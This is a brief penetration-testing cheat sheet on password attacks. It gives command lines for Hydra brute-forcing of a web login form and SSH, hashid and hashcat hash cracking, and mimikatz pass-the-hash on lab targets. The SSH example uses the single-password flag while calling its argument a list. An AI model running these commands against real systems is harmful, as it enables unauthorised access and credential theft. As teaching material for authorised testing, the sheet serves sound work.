# Password Attacks

#### HTTP POST Attack with THC-Hydra

* **Using THC-Hydra:**
  *   Perform an HTTP POST attack using Hydra to brute-force login credentials.

      ```bash
      hydra -l admin -P pass.txt 192.168.1.12 http-post-form "/mutillidae/index.php?page=login.php:username=admin&password=^PASS^&login-php-submit-button=Login:Password incorrect"
      ```
  * Replace `admin`, `pass.txt`, and `192.168.1.12` with the target username, password list, and IP address, respectively.

#### SSH Attack with THC-Hydra

* **Using THC-Hydra:**
  *   Conduct an SSH attack using Hydra to brute-force SSH credentials.

      ```bash
      hydra -l levi -p levi.txt ssh:192.168.1.12 -v
      ```
  * Replace `levi`, `levi.txt`, and `192.168.1.12` with the target username, password list, and IP address, respectively.

#### Leveraging Password Hashing

* **Identify Hash Type:**
  *   Use hashid to identify the hash type.

      ```bash
      hashid '$6$efxS7PCQU0SZi33L$H7sWCUQJ0dDBKwSZmxwADtp6D553OyjFRUfA3PKnf4JAT625jiRvDBFUTB2501CLCDzNlbjkCqM4PFJsxV9Qx'
      ```
* **Crack Hash with Hashcat:**
  *   Use Hashcat to crack the hash.

      ```bash
      hashcat -a 0 -m 1800 hash.txt rockyou.txt
      ```

#### Pass The Hash Attack

* **Using mimikatz:**
  *   Execute Pass The Hash Attack with mimikatz.

      ```bash
      mimikatz.exe
      privilege::debug
      token::elevate
      privilege::debug
      sekurlsa::pth /user:Administrator /domain:ignite.local /ntlm:32ed87bdb5fdc5e9cba88547376818d4
      ```
* Use the `sekurlsa::pth` command to pass the hash for privilege escalation.
